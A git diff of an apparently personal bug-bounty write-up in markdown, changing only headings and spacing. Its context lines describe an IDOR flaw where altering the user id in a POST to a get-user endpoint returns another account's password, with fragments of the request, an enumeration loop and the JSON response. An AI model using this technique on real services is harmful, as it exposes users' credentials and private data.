@@ -14,7 +14,7 @@ tags:
 
 <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
 
-## A little information about IDOR vulnerabilities
+## Overview
 
 Insecure direct object reference (IDOR) is a type of access control vulnerability that arises when applications use user-supplied input to access objects directly. IDOR vulnerabilities are most often associated with horizontal privilege escalation, But can also arise in connection with vertical privilege escalation.
 
@@ -25,6 +25,7 @@ I explored the API requests manually using the Burp Suite proxy, During the sear
 Using a **POST** request on the **/get-user** endpoint change the user id to another user id the response will contain important information about the user account including the password.
 
 ### Request
+
 ```
 POST /api/landing-page/get-user HTTP/1.1
 Host: redacted.com
@@ -76,9 +77,12 @@ for i in range(10):
 ```
 
 ### The Results
+
 ```
 $ python3 main.py
+```
 
+```
 {
   "code": "0",
   "info": "Successfully Get User Results",
@@ -135,7 +139,7 @@ $ python3 main.py
 }
 ```
 
-### Eventually
+## Eventually
 ![image](https://raw.githubusercontent.com/thd3r/thd3r.github.io/master/assets/images/writeup/2023-07-04-IDOR_1/Screenshot_2023-07-04_01-04-06.png)
 
 ## Conclusion
